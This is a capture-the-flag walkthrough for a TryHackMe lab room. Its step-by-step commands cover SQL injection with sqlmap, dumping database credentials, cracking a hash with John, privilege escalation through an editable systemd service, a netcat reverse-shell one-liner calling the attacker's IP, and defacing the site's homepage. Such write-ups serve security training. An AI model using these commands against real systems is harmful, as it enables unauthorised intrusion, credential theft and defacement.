---
description: Walkthrough (Medium)
---

# Revenge 🟠🟠

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

[https://tryhackme.com/r/room/revenge](https://tryhackme.com/r/room/revenge)

### Reconnaissance

```bash
nmap -T4 -sVC 10.10.234.54 -oN nmap
```

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

* Found ssh and http ports are open.

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.234.54/ -w /usr/share/wordlists/directory-list-2.3-medium.txt -x 'txt'
```
{% endcode %}

* Found interesting directory **/requirements.txt**

```html
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

* Found that its running **SQL** and lets try out sqlmap on it.

### Sqlmap

```purebasic
sqlmap -u "http://10.10.234.54/products/1" --current-db 
```

```
[10:34:50] [INFO] fetching current database
current database: 'duckyinc'
```

* Found ' **duckyinc  ' database**

```bash
sqlmap -u "http://10.10.234.54/products/1" -D duckyinc --tables 
```

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

### Flag 1 >

```bash
sqlmap -u "http://10.10.234.54/products/1" -D duckyinc --dump
```

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

* Found 1st Flag in credit\_card column of mandrews username.

***

### Flag 2 >

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

* Found 3 users in system\_user table in the dump
* Copy the hash of server-admin and crack it using john The Ripper

```bash
john server.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

* Now got both username and password lets **SSH.**

```bash
ssh server-admin@10.10.234.54
```

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

* Found **flag2.txt**

***

### Flag 3 >

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

* User can run duckyinc.service and modify it so lets connect it to our machine ( Reverse Shell ).

```bash
sudoedit /etc/systemd/system/duckyinc.service
```

```bash
[Service]
User=root
Group=root
ExecStart= /bin/bash /tmp/shell.sh
```

* Change the user, Group to root and ExecStart like above, rest as it is
* Here we made the program to run by root, root is using /bin/bash to /tmp/shell.sh file
* In /tmp/shell.sh we need to put code for reverse shell.

```bash
vim /tmp/shell.sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.38.157 4444 >/tmp/f
```

* Change the IP address to your machine IP address and your desired port

```bash
nc -nvlp 4444
```

* Run this listener in your machine , new tab.

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```

* This will restart the service and  connects to our machine and we got root.
* Here the thing is until we corrupts the home page we dont get flag3.

```bash
vim /var/www/duckyinc/templates/index.html
```

* ' \<p> Hi There \</p> ' add any kind of html tag and save it.&#x20;
* in vim to save and exit -> press ( esc ) then type ( :wq ) then press ( enter ).

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

* Found the Final flag. Submit it.
